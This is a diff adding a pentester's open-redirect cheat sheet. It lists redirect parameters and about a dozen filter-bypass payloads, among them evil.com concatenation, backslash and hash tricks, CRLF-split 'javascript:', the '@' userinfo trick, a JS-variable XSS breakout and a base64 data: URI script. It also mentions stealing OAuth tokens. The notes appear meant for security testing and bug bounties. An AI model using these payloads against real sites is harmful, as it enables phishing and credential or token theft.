@@ -1,0 +1,110 @@
+open redirection Vulnerability.
+when a web application or server doesn't validate the user submitted link to redirect the user to a given website or page. even though it being harmless action to let user decide to which page he wants to redirect but if it is being exploited can have serious impact on the application security, specially when combined with other vulns.
+Have low hanging fruit but when combined with other vulns, it will have a serious impact.
+
+Pentester land  Open Redirect Cheat Sheet
+https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html
+
+Common Injection points redirect.
+{payload}
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload
+
+Using a whitelisted domain or keyword
+Test Cases for open redirection
+Case 1 
+Get the parameter and redirect it without any validation.
+so attacker will redirect to website that he own to steal user credentials or setup backdoor on the server that he own.
+so attacker can chain this vulnerability with xss , ssrf , oAuth .
+Case2
+concation method mean get the parameter and concate it with any input that come from param
+?para=.evil.com   - it will redirect to trusteddomain.com.evil.com
+
+Case3 
+validate http , https protocol , subdomain validated so how we can by pass it . 
+for example .target.com must exist.
+?param=http://evil.com.google.com    - when the server check for the validation will match because http protocol exist and the subdomain .google.com exist.
+
+if the developer validate the slah and hash you can use backslah.
+?param=http://evil.com\.google.com  - backslah before trusted subdomain, or hash.
+?param=http://evil.com#.google.com - hash before trusted subdomain , but encoding the hash  %23 
+?param=http://evil.com/.google.com  - you can make the subdomain file from your evil domain.
+
+Case4
+if the developer validate the // in the https://google.com  you can delete the //  
+
+Steal oAuth2.0 via open redirect.
+
+By passes for open redirect mechanism.
+1.Contaction method
+www.whitelisted.com.evil.com redirect to evil.com
+
+2.Using CRLF to bypass "javascript" blacklisted keyword
+https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+java%0d%0ascript%0d%0a:alert(0)
+
+3. using // & //// to bypass http blacklist keyword.  
+//google.com
+////google.com
+4. Using "https:" to bypass "//" blacklisted keyword
+    https:google.com  
+5. \/\/ google.com  if the server block slash you can use back slah.
+   Using %E3%80%82 to bypass blacklisted parameters
+/?redir=google。com
+//google%E3%80%82com
+
+Using null bytes
+6.google%00com 
+
+7.Using parameter pollution
+?next=domain.com&next=google.com
+
+8.using @ will redirect user to anything after @
+http://www.theirsite.com@yoursite.com/
+
+9.creating folder as their domain 
+http://www.yoursite.com/http://www.theirsite.com
+
+10. Using "?" characted, browser will translate it to "/?"
+http://yoursite.com?http://www.theirsite.com/
+http://www.yoursite.com?folder/www.folder.com
+
+11.Host/Split Unicode Normalization
+http://evil.c^a/c.example.com -> http://evil.ca/c.example.com
+
+
+12.XSS from Open URL - If it's in a JS variable
+";alert(1);//
+13. http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
+
+References.
+https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html
+https://sadikul-islam.medium.com/open-redirection-to-google-oauth-token-stealing-8475f12e03cf
+https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+https://corneacristian.medium.com/top-25-open-redirect-bug-bounty-reports-5ffe11788794
+https://infosecwriteups.com/open-redirection-leads-to-a-bounty-d94029e11d17
+https://www.hahwul.com/phoenix/ssrf-open-redirect/
+https://github.com/R0X4R/D4rkXSS
+
